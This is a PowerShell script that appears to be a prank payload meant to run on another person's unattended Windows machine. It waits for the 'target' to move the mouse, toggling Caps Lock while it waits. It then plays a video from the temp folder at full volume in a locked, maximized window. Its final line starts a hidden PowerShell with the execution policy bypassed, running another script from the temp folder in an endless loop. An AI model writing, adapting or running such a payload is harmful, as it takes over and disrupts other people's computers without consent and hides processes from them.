function Target-Comes {
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#############################################################################################################################################


#WPF Library for Playing Movie and some components
Add-Type -AssemblyName PresentationFramework

Add-Type -AssemblyName System.ComponentModel
#XAML File of WPF as windows for playing movie

[xml]$XAML = @"
 
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="PowerShell Video Player" WindowState="Maximized" ResizeMode="NoResize" WindowStartupLocation="CenterScreen" >
        <MediaElement Stretch="Fill" Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop"  />
</Window>
"@
 
#Movie Path
[uri]$VideoSource = "$env:TMP\rr\rr.mp4"
 
#Devide All Objects on XAML
$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
$VideoPlayer = $Window.FindName("VideoPlayer")

 
#Video Default Setting
$VideoPlayer.Volume = 100;
$VideoPlayer.Source = $VideoSource;
#$VideoPlayer.Padding = new Thickness(5);


Target-Comes

$VideoPlayer.Play()
 
#Show Up the Window 
$Window.ShowDialog() | out-null

$D="$env:TMP"+'\rr'
powershell -w h -NoP -NonI -Exec Bypass "while (1) {$D\rr1.ps1}"
